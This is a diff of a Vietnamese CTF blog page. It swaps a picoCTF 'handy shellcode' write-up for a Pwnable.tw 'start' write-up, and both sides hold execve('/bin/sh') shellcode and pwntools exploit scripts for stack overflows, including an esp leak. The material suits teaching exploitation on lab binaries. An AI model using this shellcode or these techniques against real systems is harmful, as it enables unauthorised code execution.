@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>handy shellcode - Hjn4 Blog</title>
+        <title>start - Hjn4 Blog</title>
 
 
         <!-- Custom HTML head -->
@@ -83,7 +83,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item affix "><a href="../../../homepage.html">HOME - Huy Na</a></li><li class="chapter-item affix "><li class="part-title">ROP Emporium</li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2win_challenge.html">ret2win - challenge 1</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/split_challenge.html">split - challenge 2</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/callme_challenge.html">callme - challenge 3</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/write4_challenge.html">write4 - challenge 4</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html">badchars - challenge 5</a></li><li class="chapter-item affix "><li class="part-title">Pwnable.tw</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/start_challenge.html">start</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html">orw</a></li><li class="chapter-item affix "><li class="part-title">Pwn from blabla</li><li class="chapter-item expanded "><a href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html" class="active">handy shellcode</a></li><li class="chapter-item affix "><li class="part-title">Docker</li></ol>
+                <ol class="chapter"><li class="chapter-item affix "><a href="../../../homepage.html">HOME - Huy Na</a></li><li class="chapter-item affix "><li class="part-title">ROP Emporium</li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2win_challenge.html">ret2win - challenge 1</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/split_challenge.html">split - challenge 2</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/callme_challenge.html">callme - challenge 3</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/write4_challenge.html">write4 - challenge 4</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html">badchars - challenge 5</a></li><li class="chapter-item affix "><li class="part-title">Pwnable.tw</li><li class="chapter-item expanded "><a href="../../../blogs/PWN/Pwnable_tw/start_challenge.html" class="active">start</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html">orw</a></li><li class="chapter-item affix "><li class="part-title">Pwn from blabla</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html">handy shellcode</a></li><li class="chapter-item affix "><li class="part-title">Docker</li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -163,111 +163,72 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="handy-shellcode-picoctf2019"><a class="header" href="#handy-shellcode-picoctf2019">handy shellcode PicoCTF2019</a></h1>
-<pre><code class="language-python">file vuln                                                                                                   
-vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65fbf1fba331b6b09a6812a338dbb1118e68e9, not stripped
+                        <h1 id="start"><a class="header" href="#start">start</a></h1>
+<pre><code class="language-python">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/start$ file start
+start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
 </code></pre>
-<p>Source code: </p>
-<pre><code class="language-c">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/types.h&gt;
+<pre><code class="language-shell">pwndbg&gt; info functions
+All defined functions:
 
-#define BUFSIZE 148
-#define FLAGSIZE 128
-
-void vuln(char *buf){
-  gets(buf);
-  puts(buf);
-}
-
-int main(int argc, char **argv){
-
-  setvbuf(stdout, NULL, _IONBF, 0);
-  
-  // Set the gid to the effective gid
-  // this prevents /bin/sh from dropping the privileges
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
-
-  char buf[BUFSIZE];
-
-  puts(&quot;Enter your shellcode:&quot;);
-  vuln(buf);
-
-  puts(&quot;Thanks! Executing now...&quot;);
-  
-  ((void (*)())buf)();
-
-  puts(&quot;Finishing Executing Shellcode. Exiting now...&quot;);
-  
-  return 0;
-}
+Non-debugging symbols:
+0x08048060  _start
+0x0804809d  _exit
+0x080490a3  __bss_start
+0x080490a3  _edata
+0x080490a4  _end
 </code></pre>
-<p>Ta nhận thấy là với hàm <em><strong>vuln</strong></em> với việc gọi đến <strong>gets</strong> cho phép ta thực hiện overflow</p>
-<p>Hơn nữa ta phải xác định xem:</p>
-<pre><code class="language-c">((void (*)())buf)();
+<p>run thử binary:</p>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/start$ ./start
+Let's start the CTF:abc
 </code></pre>
-<p>rốt cuộc là gì?</p>
-<p>Debug:</p>
-<pre><code class="language-python">0x08048959 &lt;+128&gt;:	push   eax
-   0x0804895a &lt;+129&gt;:	call   0x80502f0 &lt;puts&gt;
-   0x0804895f &lt;+134&gt;:	add    esp,0x10
-   0x08048962 &lt;+137&gt;:	lea    eax,[ebp-0xa0]
-   0x08048968 &lt;+143&gt;:	call   eax
-   0x0804896a &lt;+145&gt;:	sub    esp,0xc
-   0x0804896d &lt;+148&gt;:	lea    eax,[ebx-0x2dbc8]
-   0x08048973 &lt;+154&gt;:	push   eax
-   0x08048974 &lt;+155&gt;:	call   0x80502f0 &lt;puts&gt;
-   0x08048979 &lt;+160&gt;:	add    esp,0x10
-   0x0804897c &lt;+163&gt;:	mov    eax,0x0
-   0x08048981 &lt;+168&gt;:	lea    esp,[ebp-0x8]
-   0x08048984 &lt;+171&gt;:	pop    ecx
-   0x08048985 &lt;+172&gt;:	pop    ebx
-   0x08048986 &lt;+173&gt;:	pop    ebp
-   0x08048987 &lt;+174&gt;:	lea    esp,[ecx-0x4]
-   0x0804898a &lt;+177&gt;:	ret    
+<h3 id="_start"><a class="header" href="#_start">_start</a></h3>
+<pre><code class="language-python">pwndbg&gt; disass _start
+Dump of assembler code for function _start:
+   0x08048060 &lt;+0&gt;:     push   esp
+   0x08048061 &lt;+1&gt;:     push   0x804809d
+   0x08048066 &lt;+6&gt;:     xor    eax,eax
+   0x08048068 &lt;+8&gt;:     xor    ebx,ebx
+   0x0804806a &lt;+10&gt;:    xor    ecx,ecx
+   0x0804806c &lt;+12&gt;:    xor    edx,edx
+   0x0804806e &lt;+14&gt;:    push   0x3a465443
+   0x08048073 &lt;+19&gt;:    push   0x20656874
+   0x08048078 &lt;+24&gt;:    push   0x20747261
+   0x0804807d &lt;+29&gt;:    push   0x74732073
+   0x08048082 &lt;+34&gt;:    push   0x2774654c
+   0x08048087 &lt;+39&gt;:    mov    ecx,esp
+   0x08048089 &lt;+41&gt;:    mov    dl,0x14
+   0x0804808b &lt;+43&gt;:    mov    bl,0x1
+   0x0804808d &lt;+45&gt;:    mov    al,0x4
+   0x0804808f &lt;+47&gt;:    int    0x80
+   0x08048091 &lt;+49&gt;:    xor    ebx,ebx
+   0x08048093 &lt;+51&gt;:    mov    dl,0x3c
+   0x08048095 &lt;+53&gt;:    mov    al,0x3
+   0x08048097 &lt;+55&gt;:    int    0x80
+   0x08048099 &lt;+57&gt;:    add    esp,0x14
+   0x0804809c &lt;+60&gt;:    ret
+End of assembler dump.
 </code></pre>
-<p>Ta nhận thấy giữa 2 lần gọi <strong>puts</strong> thì xuất hiện việc <em><strong>call eax</strong></em> chắc hẳn đây chính là đáp án cho câu hỏi trên.</p>
-<p>Tiến hành đặt breakpoint tại <em><strong>call eax</strong></em> </p>
-<pre><code class="language-python">──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
-*EAX  0xffffcf68 ◂— 0x636261 /* 'abc' */
- EBX  0x80da000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
-*ECX  0x80da227 (_IO_2_1_stdout_+71) ◂— 0xdb8700a
-*EDX  0x80db870 (_IO_stdfile_1_lock) ◂— 0x0
- EDI  0x80481a8 (_init) ◂— push ebx
- ESI  0x80da000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
- EBP  0xffffd008 ◂— 0x0
-*ESP  0xffffcf60 ◂— 0xf0
-*EIP  0x8048968 (main+143) ◂— call eax
-────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────
- ► 0x8048968 &lt;main+143&gt;    call   eax                           &lt;0xffffcf68&gt;
- 
-</code></pre>
-<p>Thì ta nhận thấy nó call thẳng tới thanh ghi eax mà trong khi đó eax lúc này chứa chuỗi mà ta nhập vào.</p>
-<pre><code class="language-zsh">    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
+<p>Ok, giờ thì chúng ta cùng đọc asm.</p>
+<p>Ta nhận thấy ở đây có 2 lần gọi <strong>int 0x80</strong> tức là có sử dungj systemcall, ta nhận thấy là <strong>%eax = 0x3</strong> là lệnh <em>read</em>, nếu <strong>0x4</strong> là lệnh <em>write</em></p>
+<p>Vậy thì có vẻ như chương trình dùng <strong>write</strong> để in ra dòng <em>Let's start the CTF:</em> sau đấy dùng <strong>read</strong> để mà đọc chuỗi từ user.</p>
+<pre><code class="language-js">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/start$ checksec start
+[*] '/mnt/d/pwn_myself/pwnable_tw/start/start'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
     NX:       NX disabled
     PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments
 </code></pre>
-<p>Với NX bị disable do đó ta có thể đưa shell code vào, để nó gọi ngay tới shell code của mình.</p>
-<p>Ta tra bảng <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">systemcall x86 32-bit</a> và dùng <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">tool</a> để viết shell code, convert từ ASM =&gt; hex</p>
-<p>Ta sẽ dùng systemcall : <em><strong>execve(&quot;/bin/sh&quot;)</strong></em></p>
-<p>Cụ thể như sau:</p>
-<ul>
-<li>EAX = 0x0b</li>
-<li>EBX = địa chỉ chuỗi &quot;/bin/sh&quot;</li>
-<li>ECX = EDX = 0</li>
-</ul>
-<pre><code class="language-python">&gt;&gt;&gt; import binascii
-&gt;&gt;&gt; binascii.hexlify(b&quot;/bin/sh\0&quot;[::-1])
-b'0068732f6e69622f'
+<p>Oke đỏ lè thế kia thì ta có thể dùng shellcode hay overflow tùy í. giờ thì bắt tay vào làm.</p>
+<p>Đặt breakpoint tại <strong>0x08048097 và 0x0804809c</strong> tính được cần overflow 20bytes để đến được return address</p>
+<p>Mà return thì return về đâu, kịch bản là ta sẽ add shellcode vào rồi gọi đến shell code để thực thi, tuy nhiên thì cần xác định địa chỉ của shellcode, mà shellcode được nạp vào stack nên cần phải leak được địa chỉ esp. Do đó ta sẽ return về hàm <em>write</em> nhằm leak các giá trị trên stack, và esp cũng nằm trên stack</p>
+<pre><code class="language-python">0x08048099 &lt;+57&gt;:    add    esp,0x14
 </code></pre>
-<p>Với kiến trúc 32-bit:</p>
-<pre><code class="language-python">xor eax,eax
+<p>Do là sau khi read xong, thì thu hồi stack, <strong>esp + 20</strong> tức là 20 bytes  của chuối nãy ta in ra màn hình, nay đã thu hồi mà ta lại gọi hàm write =&gt; in ra các giá trị trên stack bao gồm cả <em>esp</em></p>
+<p>Sau khi mà đã leak được <em>esp</em> thì ta vào hàm read, lúc này ta gửi payload thứ 2 gồm: 20 bytes BOF, địa chỉ return về chính là địa chỉ lưu shellcode = esp + 20, shellcode</p>
+<h3 id="shellcode"><a class="header" href="#shellcode">shellcode</a></h3>
+<pre><code class="language-python">sub esp,0x50
+xor eax,eax
 add eax,0x0b
 xor ecx,ecx
 xor edx,edx
@@ -277,26 +238,35 @@ push 0x6e69622f
 mov ebx,esp
 int 0x80
 </code></pre>
-<p>Exploit:</p>
+<h3 id="exploit"><a class="header" href="#exploit">Exploit</a></h3>
 <pre><code class="language-python">from pwn import *
 
-r = process(&quot;./vuln&quot;)
-#gdb.attach(r, api=True)
-#print(r.recvuntil(b&quot;shellcode:&quot;))
-payload = &quot;\x31\xC0\x83\xC0\x0B\x31\xC9\x31\xD2\x52\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80&quot;
+#p = remote('chall.pwnable.tw',10000)
+p = process(&quot;./start&quot;)
 
-r.sendline(payload)
-r.interactive()
+print(p.recvuntil(':'))
+payload1 = b'A'*20 + p32(0x08048087) 
+p.send(payload1)
+#print(p.recv())
+
+shellcode = b'\x83\xEC\x50\x31\xC0\x83\xC0\x0B\x31\xC9\x31\xD2\x52\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80'
+payload2 = b'A'*20 + p32(u32(p.recv()[:4]) + 20) + shellcode
+
+p.send(payload2)
+p.interactive()
 </code></pre>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                            <a rel="prev" href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                            <a rel="prev" href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
 
+                            <a rel="next" href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
 
                         <div style="clear: both"></div>
                     </nav>
@@ -304,10 +274,13 @@ r.interactive()
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                    <a rel="prev" href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                    <a rel="prev" href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
 
+                    <a rel="next" href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
             </nav>
 
         </div>
